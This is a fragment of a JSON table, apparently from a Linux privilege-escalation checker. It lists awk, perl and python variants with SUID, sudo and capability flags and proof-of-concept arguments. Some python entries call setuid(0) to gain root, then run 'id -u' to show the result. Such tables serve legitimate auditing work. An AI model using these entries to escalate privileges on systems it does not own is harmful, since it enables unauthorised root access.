  "awk": {"suid": true, "sudo": true, "capability": false, "poc_args": ["BEGIN{system(\"id -u\")}"]},
  "gawk": {"suid": true, "sudo": true, "capability": false, "poc_args": ["BEGIN{system(\"id -u\")}"]},
  "perl": {"suid": true, "sudo": true, "capability": true, "poc_args": ["-e", "exec('id','-u');"]},
  "python": {"suid": true, "sudo": true, "capability": true, "poc_args": ["-c", "import os; os.system('id -u')"], "cap_poc_args": ["-c", "import os; os.setuid(0); os.setgid(0); os.system('id -u')"]},
  "python2": {"suid": true, "sudo": true, "capability": true, "poc_args": ["-c", "import os; os.system('id -u')"], "cap_poc_args": ["-c", "import os; os.setuid(0); os.setgid(0); os.system('id -u')"]},
  "python2.7": {"suid": true, "sudo": true, "capability": true, "poc_args": ["-c", "import os; os.system('id -u')"], "cap_poc_args": ["-c", "import os; os.setuid(0); os.setgid(0); os.system('id -u')"]},
  "python3": {"suid": true, "sudo": true, "capability": true, "poc_args": ["-c", "import os; os.system('id -u')"], "cap_poc_args": ["-c", "import os; os.setuid(0); os.setgid(0); os.system('id -u')"]},
